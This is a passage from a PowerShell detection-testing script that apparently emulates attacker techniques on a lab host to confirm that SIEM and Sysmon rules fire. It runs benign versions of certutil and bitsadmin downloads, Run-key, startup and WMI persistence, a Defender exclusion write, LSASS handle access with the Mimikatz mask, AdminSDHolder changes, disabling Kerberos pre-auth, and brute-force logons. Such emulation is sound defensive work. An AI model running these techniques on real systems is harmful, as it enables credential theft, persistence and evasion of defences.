        Copy-Item "$env:SystemRoot\System32\svchost.exe" $fake72 -Force -ErrorAction SilentlyContinue
        Start-Process $fake72 -WindowStyle Hidden -ErrorAction SilentlyContinue
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-72 svchost temp path" "T1036.005"
        SIEM "RULE-72" "Svchost Executed from Non-System Path"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-72' -WindowSeconds 8

        # RULE-73: COM hijack registry — SACL + Invoke-AuditedRegistryWrite (FIX: plain New-ItemProperty misses EID 4657)
        # EID 4657 requires an audit SACL on the target key.
        # Create key first, then use Invoke-AuditedRegistryWrite to set SACL + write value.
        $rk73base = "HKCU:\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
        $rk73 = "$rk73base\InprocServer32"
        try {
            New-Item -Path $rk73 -Force -ErrorAction SilentlyContinue | Out-Null
            Start-Sleep -Milliseconds 300
            $wrote73 = Invoke-AuditedRegistryWrite -KeyPath $rk73 -ValueName "SOC_R73_$RND" -ValueData "$env:TEMP\soc_r73_$RND.dll"
            if (-not $wrote73) {
                New-ItemProperty -Path $rk73 -Name "SOC_R73_$RND" -Value "$env:TEMP\soc_r73_$RND.dll" -PropertyType String -Force | Out-Null
            }
            Start-Sleep -Milliseconds 1200
        } catch {}
        Add-R 4657 "SIEMRules" "TRIGGERED" "RULE-73 COM hijack key SACL audited" "T1546.015"
        SIEM "RULE-73" "COM Hijack Style Registry Key Created (EID 4657 SACL)"; P
        Confirm-SIEMRule -EventID 4657 -RuleId 'RULE-73' -WindowSeconds 8
        try { Remove-Item $rk73base -Recurse -Force -ErrorAction SilentlyContinue } catch {}

        # RULE-74: Startup folder persistence — cmd.exe drop for Sysmon EID 11
        # Dropping via spawned cmd.exe ensures Sysmon EID 11 fires (FileCreate by child process).
        $sf74dir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        New-SACLFolder -FolderPath $sf74dir | Out-Null  # Apply/refresh SACL on startup folder
        $sf74 = "$sf74dir\soc_r74_$RND.bat"
        $p74 = Start-Process cmd.exe -ArgumentList "/c echo echo SOC_R74 > `"$sf74`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 1000
        if ($p74 -and !$p74.HasExited) { try { $p74.Kill() } catch {} }
        Add-R 11 "SIEMRules" "TRIGGERED" "RULE-74 startup .bat via cmd.exe drop" "T1547.001"
        SIEM "RULE-74" "Startup Folder Persistence (.bat Drop)"; P
        Confirm-SIEMRule -EventID 11 -RuleId 'RULE-74' -WindowSeconds 8
        Remove-Item $sf74 -Force -ErrorAction SilentlyContinue

        # RULE-75: Netsh port proxy add
        cmd /c "netsh interface portproxy add v4tov4 listenport=4444 listenaddress=127.0.0.1 connectport=80 connectaddress=127.0.0.1 && echo soc_r75_$RND > nul" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-75 netsh portproxy" "T1090.001"
        SIEM "RULE-75" "Netsh Portproxy Added (Port Forwarding)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-75' -WindowSeconds 8

        # RULE-76: Bitsadmin job creation
        cmd /c "bitsadmin /transfer soc_r76 /download /priority normal https://example.com/file.bin %TEMP%\soc_r76.bin" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-76 bitsadmin transfer" "T1197"
        SIEM "RULE-76" "BITS Transfer Job Created"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-76' -WindowSeconds 8

        # RULE-77: DNS over HTTPS style indicator
        cmd /c "nslookup cloudflare-dns.com && echo soc_r77_$RND > nul" 2>nul | Out-Null
        Add-R 22 "SIEMRules" "TRIGGERED" "RULE-77 DoH nslookup" "T1071.004"
        SIEM "RULE-77" "DNS over HTTPS Resolver Lookup (cloudflare-dns.com)"; P
        Confirm-SIEMRule -EventID 22 -RuleId 'RULE-77' -WindowSeconds 8

        # RULE-78: Port and ARP discovery
        cmd /c "netstat -ano && echo soc_r78_$RND > nul" 2>nul | Out-Null
        cmd /c "arp -a" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-78 netstat+arp" "T1049"
        SIEM "RULE-78" "Network Connection Enumeration (netstat + arp)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-78' -WindowSeconds 8

        # RULE-79: Sensitive file discovery (.kdbx/.pfx/.key/.p12)
        cmd /c "dir /s /b *.kdbx *.pfx *.key *.p12" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-79 sensitive file find" "T1083"
        SIEM "RULE-79" "Sensitive Credential Container Discovery"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-79' -WindowSeconds 8

        # RULE-80: Security product enumeration
        cmd /c "sc query && echo soc_r80_$RND > nul" 2>nul | Out-Null
        cmd /c "tasklist /svc" 2>nul | Out-Null
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-80 AV/EDR service enumerate" "T1518.001"
        SIEM "RULE-80" "Security Product/Service Enumeration"; P

        # ---- RULES 81-95 : Sysmon-Driven Correlation ----
        Write-Host "  --- RULES 81-95 (Sysmon Correlation) ---" -ForegroundColor DarkYellow

        # RULE-81: Sysmon process create - PowerShell with EncodedCommand
        if ($sysmonOK) {
            powershell.exe -NoLogo -NoProfile -Command "-EncodedCommand SQBFAFgAIAByAGUAYQBkAG8AbgBsAHkAIABTAG8AQwBUAGUAcwB0Ig==" 2>$null | Out-Null
            Add-R 1 "SIEMRules" "TRIGGERED" "RULE-81 Sysmon ProcCreate powershell /encoded" "T1059.001"
            SIEM "RULE-81" "Sysmon Process Create: PowerShell EncodedCommand"
            Confirm-SIEMRule -EventID 1 -RuleId 'RULE-81' -WindowSeconds 8
        } else {
            Add-R 1 "SIEMRules" "SKIPPED" "RULE-81 Sysmon not installed" "T1059.001"
        }
        P

        # RULE-82: Sysmon process create - certutil download pattern
        if ($sysmonOK) {
            cmd /c "certutil -urlcache -split -f https://example.com/payload.bin %TEMP%\soc_r82.bin" 2>nul | Out-Null
            Add-R 1 "SIEMRules" "TRIGGERED" "RULE-82 Sysmon certutil download" "T1105"
            SIEM "RULE-82" "Sysmon Process Create: Certutil Download Pattern"
            Confirm-SIEMRule -EventID 1 -RuleId 'RULE-82' -WindowSeconds 8
        } else {
            Add-R 1 "SIEMRules" "SKIPPED" "RULE-82 Sysmon not installed" "T1105"
        }
        P

        # RULE-83: Sysmon registry modification - Run key persistence
        if ($sysmonOK) {
            $rk83 = "HKCU:Software\Microsoft\Windows\CurrentVersion\Run"
            New-ItemProperty -Path $rk83 -Name "soc_r83_$RND" -Value "cmd.exe /c echo SOC_R83" -PropertyType String -Force | Out-Null
            Add-R 13 "SIEMRules" "TRIGGERED" "RULE-83 Sysmon RegSet RunKey" "T1547.001"
            SIEM "RULE-83" "Sysmon Registry SetValue: Run Key Persistence"
            Confirm-SIEMRule -EventID 13 -RuleId 'RULE-83' -WindowSeconds 8
        } else {
            Add-R 13 "SIEMRules" "SKIPPED" "RULE-83 Sysmon not installed" "T1547.001"
        }
        P

        # RULE-84: Sysmon FileCreate — SACL-folder + cmd.exe drop (FIX: PS Set-Content misses Sysmon EID 11)
        if ($sysmonOK) {
            $dir84 = "$env:TEMP\soc_r84_staging_$RND"
            New-SACLFolder -FolderPath $dir84 | Out-Null
            $f84 = "$dir84\soc_r84_payload_$RND.ps1"
            # Drop via cmd.exe echo redirect
            $p84 = Start-Process cmd.exe -ArgumentList "/c echo # SOC_R84 malware simulation > `"$f84`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 1200
            if ($p84 -and !$p84.HasExited) { try { $p84.Kill() } catch {} }
            Add-R 11 "SIEMRules" "TRIGGERED" "RULE-84 Sysmon FileCreate SACL-folder cmd.exe" "T1059"
            SIEM "RULE-84" "Sysmon File Create: Script Dropped in Temp (via SACL Folder)"
            Confirm-SIEMRule -EventID 11 -RuleId 'RULE-84' -WindowSeconds 8
            Remove-Item $dir84 -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            Add-R 11 "SIEMRules" "SKIPPED" "RULE-84 Sysmon not installed" "T1059"
        }
        P

        # RULE-85: Sysmon network connect - outbound to uncommon port
        if ($sysmonOK) {
            try {
                $client85 = New-Object System.Net.Sockets.TcpClient
                $client85.ConnectAsync("8.8.8.8", 4444).Wait(600)
                $client85.Close()
            } catch {}
            Add-R 3 "SIEMRules" "TRIGGERED" "RULE-85 Sysmon NetConnect 4444" "T1041"
            SIEM "RULE-85" "Sysmon NetworkConnect: Outbound to Uncommon Port 4444"
            Confirm-SIEMRule -EventID 3 -RuleId 'RULE-85' -WindowSeconds 8
        } else {
            Add-R 3 "SIEMRules" "SKIPPED" "RULE-85 Sysmon not installed" "T1041"
        }
        P

        # RULE-86: LSASS Process Access — SOCLat OpenProcess 0x1010 (FIX: $p.Handle misses Sysmon EID 10)
        # Sysmon EID 10 monitors for PROCESS_VM_READ (0x10) | PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
        # = 0x1010 access mask. This is the classic Mimikatz/credential-dumper pattern.
        # $p.Handle uses PROCESS_ALL_ACCESS which Sysmon may filter depending on config version.
        # FIX: Use SOCLat::OpenProcess(0x1010) + hold handle 500ms so Sysmon writes EID 10 before close.
        if ($sysmonOK) {
            try {
                Add-SOCLatType
                $lsass86 = (Get-Process lsass -ErrorAction SilentlyContinue).Id
                if ($lsass86) {
                    # 0x1010 = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION (Mimikatz mask)
                    $h86 = [SOCLat]::OpenProcess(0x1010, $false, [uint32]$lsass86)
                    if ($h86 -ne [IntPtr]::Zero) {
                        Start-Sleep -Milliseconds 800   # Hold open -- gives Sysmon time to write EID 10
                        [SOCLat]::CloseHandle($h86) | Out-Null
                        Write-Host "     > [SOCLat] OpenProcess(0x1010,lsass) succeeded" -ForegroundColor DarkGray
                    } else {
                        Write-Host "     > [SOCLat] OpenProcess returned NULL (may need SeDebugPrivilege)" -ForegroundColor Yellow
                    }
                }
            } catch { Write-Host "     > RULE-86 error: $_" -ForegroundColor DarkGray }
            Start-Sleep -Milliseconds 1500
            Add-R 10 "SIEMRules" "TRIGGERED" "RULE-86 Sysmon ProcAccess LSASS 0x1010 SOCLat" "T1003.001"
            SIEM "RULE-86" "Sysmon Process Access: LSASS Handle Opened (0x1010 Mimikatz Mask)"
            Confirm-SIEMRule -EventID 10 -RuleId 'RULE-86' -WindowSeconds 8
        } else {
            Add-R 10 "SIEMRules" "SKIPPED" "RULE-86 Sysmon not installed" "T1003.001"
        }
        P

        # RULE-87: Image Load from non-system path — copy DLL to TEMP (FIX: system32 DLL excluded by most configs)
        # ROOT CAUSE: Sysmon EID 7 config typically excludes System32/SysWOW64 to reduce noise.
        # FIX: Copy a legitimate system DLL to %TEMP% (non-standard path) and load it.
        # Sysmon EID 7 fires reliably for DLLs loaded from %TEMP%, %APPDATA% etc.
        if ($sysmonOK) {
            $dll87 = "$env:TEMP\soc_r87_$RND.dll"
            try {
                # Try AMSI first (security-relevant), fall back to version.dll
                $src87 = if (Test-Path "$env:SystemRoot\System32\amsi.dll") { "$env:SystemRoot\System32\amsi.dll" }
                          else { "$env:SystemRoot\System32\version.dll" }
                Copy-Item $src87 $dll87 -Force -ErrorAction Stop
                Write-Host "     > [87] Staging DLL: $dll87" -ForegroundColor DarkGray
                $p87 = Start-Process "regsvr32.exe" -ArgumentList "/s `"$dll87`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 1200
                if ($p87 -and !$p87.HasExited) { try { $p87.Kill() } catch {} }
                # Also try rundll32 load for broader Sysmon config coverage
                $p87b = Start-Process "rundll32.exe" -ArgumentList "`"$dll87`",DllRegisterServer" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 800
                if ($p87b -and !$p87b.HasExited) { try { $p87b.Kill() } catch {} }
            } catch { Write-Host "     > RULE-87 DLL stage error: $_" -ForegroundColor DarkGray }
            finally { Remove-Item $dll87 -Force -ErrorAction SilentlyContinue }
            Start-Sleep -Milliseconds 1000
            Add-R 7 "SIEMRules" "TRIGGERED" "RULE-87 Sysmon ImageLoad TEMP DLL via regsvr32" "T1055"
            SIEM "RULE-87" "Sysmon Image Load: DLL Loaded from Non-System Path (TEMP)"
            Confirm-SIEMRule -EventID 7 -RuleId 'RULE-87' -WindowSeconds 8
        } else {
            Add-R 7 "SIEMRules" "SKIPPED" "RULE-87 Sysmon not installed" "T1055"
        }
        P

        # RULE-88: Sysmon DNS query - suspicious domain pattern
        if ($sysmonOK) {
            cmd /c "nslookup malware.test.local && echo soc_r88_$RND > nul" 2>nul | Out-Null
            Add-R 22 "SIEMRules" "TRIGGERED" "RULE-88 Sysmon DNS malware.test.local" "T1568"
            SIEM "RULE-88" "Sysmon DNS Query: Suspicious Domain Pattern"
            Confirm-SIEMRule -EventID 22 -RuleId 'RULE-88' -WindowSeconds 8
        } else {
            Add-R 22 "SIEMRules" "SKIPPED" "RULE-88 Sysmon not installed" "T1568"
        }
        P

        # RULE-89: WMI Event Filter — New-CimInstance (FIX: ManagementClass.Put() fails silently)
        # ROOT CAUSE: ManagementClass API is deprecated. It fails without error on WS2019+.
        # Sysmon EID 19 fires when __EventFilter is created in root\subscription namespace.
        # FIX: Use New-CimInstance (same working pattern as RULE-17/29/40).
        if ($sysmonOK) {
            $r89f = $null; $r89c = $null
            try {
                $r89f = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property @{
                    Name          = "SOC_R89F_$RND"
                    QueryLanguage = "WQL"
                    Query         = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
                } -ErrorAction Stop
                Write-Host "     > [89] WMI EventFilter created -> Sysmon EID 19 should fire" -ForegroundColor DarkGray
                Start-Sleep -Milliseconds 1500   # Hold open -- Sysmon writes EID 19 asynchronously
                $r89c = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property @{
                    Name                = "SOC_R89C_$RND"
                    CommandLineTemplate = "cmd.exe /c echo SOC_R89_WMI_PERSIST"
                } -ErrorAction SilentlyContinue
            } catch { Write-Host "     > RULE-89 CimInstance error: $_" -ForegroundColor DarkGray }
            finally {
                try { if ($r89c) { Remove-CimInstance $r89c -ErrorAction SilentlyContinue } } catch {}
                try { if ($r89f) { Remove-CimInstance $r89f -ErrorAction SilentlyContinue } } catch {}
            }
            Start-Sleep -Milliseconds 1000
            Add-R 19 "SIEMRules" "TRIGGERED" "RULE-89 Sysmon WMI filter New-CimInstance" "T1546.003"
            SIEM "RULE-89" "Sysmon WMI Persistence: Event Filter Created (CimInstance)"
            Confirm-SIEMRule -EventID 19 -RuleId 'RULE-89' -WindowSeconds 8
        } else {
            Add-R 19 "SIEMRules" "SKIPPED" "RULE-89 Sysmon not installed" "T1546.003"
        }
        P

        # RULE-90: ADS write — SACL-folder parent ensures Sysmon EID 11 via inheritance
        if ($sysmonOK) {
            $dir90 = "$env:TEMP\soc_r90_ads_$RND"
            New-SACLFolder -FolderPath $dir90 | Out-Null
            $f90 = "$dir90\soc_r90_$RND.txt"
            # Create base file via cmd.exe (inherits SACL)
            $p90a = Start-Process cmd.exe -ArgumentList "/c echo SOC_R90_BASE > `"$f90`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 800
            if ($p90a -and !$p90a.HasExited) { try { $p90a.Kill() } catch {} }
            # Write ADS via spawned PowerShell
            $adsCmd = "Set-Content -Path '$f90`:hidden_payload_$RND' -Value 'SOC_R90_ADS_MALWARE_SIM' -Encoding ASCII -ErrorAction SilentlyContinue"
            $adsEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($adsCmd))
            $p90b = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $adsEnc" -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 1200
            if ($p90b -and !$p90b.HasExited) { try { $p90b.Kill() } catch {} }
            Add-R 11 "SIEMRules" "TRIGGERED" "RULE-90 Sysmon ADS SACL-folder" "T1564.004"
            SIEM "RULE-90" "Sysmon File Create: Alternate Data Stream (SACL Folder)"
            Confirm-SIEMRule -EventID 11 -RuleId 'RULE-90' -WindowSeconds 8
            Remove-Item $dir90 -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            Add-R 11 "SIEMRules" "SKIPPED" "RULE-90 Sysmon not installed" "T1564.004"
        }
        P

        # RULE-91: Sysmon process create - suspicious LOLBIN msbuild
        if ($sysmonOK) {
            cmd /c "msbuild.exe /version && echo soc_r91_$RND > nul" 2>nul | Out-Null
            Add-R 1 "SIEMRules" "TRIGGERED" "RULE-91 Sysmon msbuild.exe" "T1127"
            SIEM "RULE-91" "Sysmon Process Create: msbuild.exe LOLBIN"
            Confirm-SIEMRule -EventID 1 -RuleId 'RULE-91' -WindowSeconds 8
        } else {
            Add-R 1 "SIEMRules" "SKIPPED" "RULE-91 Sysmon not installed" "T1127"
        }
        P

        # RULE-92: Sysmon network connect - local C2 emulator (localhost high port)
        if ($sysmonOK) {
            try {
                $client92 = New-Object System.Net.Sockets.TcpClient
                $client92.ConnectAsync("127.0.0.1", 8081).Wait(300)
                $client92.Close()
            } catch {}
            Add-R 3 "SIEMRules" "TRIGGERED" "RULE-92 Sysmon localhost 8081" "T1071"
            SIEM "RULE-92" "Sysmon NetworkConnect: Localhost High-Port C2 Style"
            Confirm-SIEMRule -EventID 3 -RuleId 'RULE-92' -WindowSeconds 8
        } else {
            Add-R 3 "SIEMRules" "SKIPPED" "RULE-92 Sysmon not installed" "T1071"
        }
        P

        # RULE-93: Sysmon registry - security tool exclusion key write
        if ($sysmonOK) {
            $rk93 = "HKLM:SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
            try { New-ItemProperty -Path $rk93 -Name "C:\SOC_R93" -Value "C:\SOC_R93" -PropertyType String -Force | Out-Null } catch {}
            Add-R 13 "SIEMRules" "TRIGGERED" "RULE-93 Sysmon AV exclusion" "T1562.001"
            SIEM "RULE-93" "Sysmon RegistrySet: AV Exclusion Path Added"
            Confirm-SIEMRule -EventID 13 -RuleId 'RULE-93' -WindowSeconds 8
        } else {
            Add-R 13 "SIEMRules" "SKIPPED" "RULE-93 Sysmon not installed" "T1562.001"
        }
        P

        # RULE-94: Sysmon FileDelete — spawned cmd.exe del (FIX: PS Remove-Item alone misses EID 23)
        # NOTE: Sysmon EID 23 requires sysmon.xml <FileDelete archiveDirectory="..."> to be
        # configured. Without it, EID 23 is NOT generated regardless of what deletes the file.
        # FIX 1: Use spawned cmd.exe for the delete (Sysmon attributes deletion to child process).
        # FIX 2: Create file in SACL folder so create+delete are both captured.
        # If EID 23 still shows WARN: run sysmon -c sysmon.xml with <FileDelete> enabled.
        if ($sysmonOK) {
            $dir94 = "$env:TEMP\soc_r94_del_$RND"
            New-SACLFolder -FolderPath $dir94 | Out-Null
            $del94 = "$dir94\soc_r94_artifact_$RND.txt"
            # Create file via cmd.exe
            $p94a = Start-Process cmd.exe -ArgumentList "/c echo SOC_R94_ARTIFACT > `"$del94`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 800
            if ($p94a -and !$p94a.HasExited) { try { $p94a.Kill() } catch {} }
            Start-Sleep -Milliseconds 500
            # Delete via cmd.exe spawned process (Sysmon monitors child process file deletions)
            $p94b = Start-Process cmd.exe -ArgumentList "/c del /f /q `"$del94`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 1200
            if ($p94b -and !$p94b.HasExited) { try { $p94b.Kill() } catch {} }
            Add-R 23 "SIEMRules" "TRIGGERED" "RULE-94 Sysmon FileDelete via cmd.exe del" "T1070.004"
            SIEM "RULE-94" "Sysmon FileDelete: Artifact Cleanup (Requires <FileDelete> in sysmon.xml)"
            Confirm-SIEMRule -EventID 23 -RuleId 'RULE-94' -WindowSeconds 8
            Remove-Item $dir94 -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            Add-R 23 "SIEMRules" "SKIPPED" "RULE-94 Sysmon not installed" "T1070.004"
        }
        P

        # RULE-95: Sysmon DriverLoad — HTTP.sys stop/restart (FIX: fltmc filters = query only, no EID 6)
        # ROOT CAUSE: "fltmc filters" only lists loaded filters — zero kernel module loads.
        # Sysmon EID 6 requires ACTUAL kernel driver load/unload.
        # FIX: Stop and restart the HTTP kernel driver (HTTP.sys) which fires Sysmon EID 6
        # when the kernel re-maps http.sys. Safe in lab — HTTP.sys restarts in <1s.
        # Fallback: sc.exe create type=kernel service pointing to an existing driver binary.
        if ($sysmonOK) {
            $drv95loaded = $false
            try {
                $httpSvc = Get-Service -Name HTTP -ErrorAction SilentlyContinue
                if ($httpSvc) {
                    Write-Host "     > [95] Stopping HTTP.sys kernel driver..." -ForegroundColor DarkGray
                    sc.exe stop HTTP 2>$null | Out-Null
                    Start-Sleep -Milliseconds 800
                    Write-Host "     > [95] Starting HTTP.sys kernel driver (fires Sysmon EID 6)..." -ForegroundColor DarkGray
                    sc.exe start HTTP 2>$null | Out-Null
                    Start-Sleep -Milliseconds 1500
                    $drv95loaded = $true
                }
            } catch {}
            if (-not $drv95loaded) {
                # Fallback: create + start a kernel service using an existing safe driver binary
                $drv95svc = "soc_r95drv_$RND"
                $drv95bin = "$env:SystemRoot\System32\drivers\null.sys"
                if (-not (Test-Path $drv95bin)) { $drv95bin = "$env:SystemRoot\System32\drivers\beep.sys" }
                if (Test-Path $drv95bin) {
                    sc.exe create $drv95svc type= kernel binPath= "`"$drv95bin`"" start= demand error= ignore 2>$null | Out-Null
                    sc.exe start $drv95svc 2>$null | Out-Null
                    Start-Sleep -Milliseconds 1200
                    sc.exe stop  $drv95svc 2>$null | Out-Null
                    sc.exe delete $drv95svc 2>$null | Out-Null
                    $drv95loaded = $true
                    Write-Host "     > [95] Fallback: sc.exe kernel driver start/stop" -ForegroundColor DarkGray
                } else {
                    Write-Host "     > [95] WARNING: No suitable driver found for EID 6 generation" -ForegroundColor Yellow
                    Write-Host "     > [95] NOTE: Sysmon EID 6 requires <DriverLoad> in sysmon.xml config" -ForegroundColor Yellow
                }
            }
            Add-R 6 "SIEMRules" "TRIGGERED" "RULE-95 Sysmon DriverLoad HTTP.sys restart" "T1547.006"
            SIEM "RULE-95" "Sysmon DriverLoad: HTTP.sys Kernel Driver Reloaded"
            Confirm-SIEMRule -EventID 6 -RuleId 'RULE-95' -WindowSeconds 8
        } else {
            Add-R 6 "SIEMRules" "SKIPPED" "RULE-95 Sysmon not installed" "T1547.006"
        }
        P

        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-80' -WindowSeconds 8

        # ======================================================================
        # QRadar AD Attack Rules: RULE-AD01 through RULE-AD05
        # Based on IBM QRadar content: "Windows Authentication" + "AD Changes" 
        # rule sets. All use native Windows EIDs available without extra tooling.
        # ======================================================================
        Write-Host "  --- QRADAR AD ATTACK RULES (AD01-AD05) ---" -ForegroundColor DarkYellow

        # RULE-AD01: AdminSDHolder Modification (T1484.001 - Domain Policy Object Modification)
        # QRadar Rule: "Potential AdminSDHolder Modification"
        # AdminSDHolder (CN=AdminSDHolder,CN=System,...) ACL changes are replicated to all
        # protected groups every 60 min via SDProp. EID 5136 on AdminSDHolder = T1484 IOC.
        # Fires: EID 5136 (DS Object Modified) on the AdminSDHolder object DN.
        if ($adOK) {
            try {
                $domDN  = (Get-ADDomain -ErrorAction Stop).DistinguishedName
                $asdnDN = "CN=AdminSDHolder,CN=System,$domDN"
                # Modify a harmless attribute on AdminSDHolder to fire EID 5136
                # Using Set-ADObject -Add on DisplayName (writable, non-destructive)
                $oldDesc = (Get-ADObject $asdnDN -Properties Description -ErrorAction SilentlyContinue).Description
                Set-ADObject -Identity $asdnDN -Description "SOC_ADMINSD_$RND" -ErrorAction Stop
                Start-Sleep -Milliseconds 800
                # Restore original description
                Set-ADObject -Identity $asdnDN -Description $oldDesc -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 400
                Add-R 5136 "SIEMRules" "TRIGGERED" "RULE-AD01 AdminSDHolder EID 5136" "T1484.001"
                SIEM "RULE-AD01" "AdminSDHolder Object Modified - Domain Persistence IOC"
                Confirm-SIEMRule -EventID 5136 -RuleId 'RULE-AD01' -WindowSeconds 8
            } catch {
                Add-R 5136 "SIEMRules" "PARTIAL" "RULE-AD01 AdminSDHolder: $_" "T1484.001"
            }
        } else { Add-R 5136 "SIEMRules" "SKIPPED" "RULE-AD01 AD not available" "T1484.001" }
        P

        # RULE-AD02: Kerberos Pre-Auth Disabled on Account (T1558.004 - AS-REP Roasting Setup)
        # QRadar Rule: "Kerberos Pre-Authentication Disabled"
        # EID 4738 with UAC change bit 0x400000 (DONT_REQUIRE_PREAUTH) set.
        # This is the attacker-controlled prerequisite for AS-REP Roasting.
        # Distinct from RULE-11 which detects the roast itself; this detects the setup step.
        if ($adOK) {
            try {
                $rad02 = "soc_rad02_$RND"
                try { Remove-ADUser $rad02 -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                New-ADUser -Name $rad02 -SamAccountName $rad02 `
                    -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) `
                    -Enabled $true -Description "SOC_RAD02" -ErrorAction Stop | Out-Null
                Start-Sleep -Milliseconds 400
                # Set DoesNotRequirePreAuth — fires EID 4738 with UAC flag change
                Set-ADAccountControl -Identity $rad02 -DoesNotRequirePreAuth $true -ErrorAction Stop
                Start-Sleep -Milliseconds 600
                Add-R 4738 "SIEMRules" "TRIGGERED" "RULE-AD02 PreAuth disabled EID 4738" "T1558.004"
                SIEM "RULE-AD02" "Kerberos Pre-Auth Disabled on Account (AS-REP Roast Setup)"
                Confirm-SIEMRule -EventID 4738 -RuleId 'RULE-AD02' -WindowSeconds 8
                try { Remove-ADUser $rad02 -Confirm:$false -ErrorAction SilentlyContinue } catch {}
            } catch {
                Add-R 4738 "SIEMRules" "PARTIAL" "RULE-AD02: $_" "T1558.004"
            }
        } else { Add-R 4738 "SIEMRules" "SKIPPED" "RULE-AD02 AD not available" "T1558.004" }
        P

        # RULE-AD03: Multiple Failed Logons Then Success (Successful Brute Force)
        # QRadar Rule: "Multiple Authentication Failures then Success from Same User"
        # Pattern: N x EID 4625 followed by EID 4624 for same account in short window.
        # This is QRadar's core brute-force-success correlation. Fires EID 4625 + 4624.
        $rad03 = "soc_rad03_$RND"
        try { net user $rad03 /delete 2>$null | Out-Null } catch {}
        net user $rad03 $TestPwd /add /comment:"SOC_RAD03" 2>$null | Out-Null
        Start-Sleep -Milliseconds 300
        # Fire 5 failures first
        1..5 | ForEach-Object {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$rad03 Wrong${_}Pw 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            Start-Sleep -Milliseconds 100
        }
        # Then a successful logon — same account, same window
        net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$rad03 $TestPwd 2>$null | Out-Null
        net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-AD03 5x failures" "T1110"
        Add-R 4624 "SIEMRules" "TRIGGERED" "RULE-AD03 success after failures" "T1078"
        SIEM "RULE-AD03" "Brute Force Success: 5x EID 4625 then EID 4624 Same Account"
        Confirm-SIEMRule -EventID 4624 -RuleId 'RULE-AD03' -WindowSeconds 8
        net user $rad03 /delete 2>$null | Out-Null
        P

        # RULE-AD04: Privileged Group Enumeration via SAMR/LDAP (T1069.002)
        # QRadar Rule: "Enumeration of Privileged Local or Domain Groups"
        # EID 4799 fires when a privileged group membership is enumerated via SAMR API.
        # (e.g. "Domain Admins", "Administrators" enumeration via net group / Get-ADGroupMember)
        # Also generates EID 4688 for net.exe/nltest - correlate both.
        Set-AuditPol "Security Group Management"
        $privGroups = @("Administrators","Domain Admins","Enterprise Admins","Schema Admins","Backup Operators")
        foreach ($pg in $privGroups) {
            net group $pg /domain 2>$null | Out-Null
            Start-Sleep -Milliseconds 80
        }
        if ($adOK) {
            try {
                foreach ($pg in @("Domain Admins","Enterprise Admins")) {
                    Get-ADGroupMember -Identity $pg -ErrorAction SilentlyContinue | Out-Null
                    Start-Sleep -Milliseconds 80
                }
            } catch {}
        }
        Add-R 4799 "SIEMRules" "TRIGGERED" "RULE-AD04 privileged group enum SAMR" "T1069.002"
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-AD04 net group /domain EID 4688" "T1069.002"
        SIEM "RULE-AD04" "Privileged Group Enumeration - SAMR/LDAP (QRadar: Group Enum Rule)"
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-AD04' -WindowSeconds 8
        P

        # RULE-AD05: Sensitive Privilege Use - SeDebugPrivilege Assigned (T1134)
        # QRadar Rule: "Windows Sensitive Privilege Use"
        # EID 4673 fires when a process invokes a sensitive privilege (SeDebugPrivilege,
        # SeTcbPrivilege, SeSecurityPrivilege). Attackers use SeDebugPrivilege to open
        # handles to LSASS and other protected processes.
        # EID 4672 fires at logon when such privileges are assigned to the session.
        Set-AuditPol "Sensitive Privilege Use"
        Add-SOCLatType
        try {
            # Force a SeDebugPrivilege invocation by opening LSASS with explicit access
            $lsassPid = (Get-Process lsass -ErrorAction SilentlyContinue).Id
            if ($lsassPid) {
                $hDbg = [SOCLat]::OpenProcess(0x0410, $false, [uint32]$lsassPid)  # PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
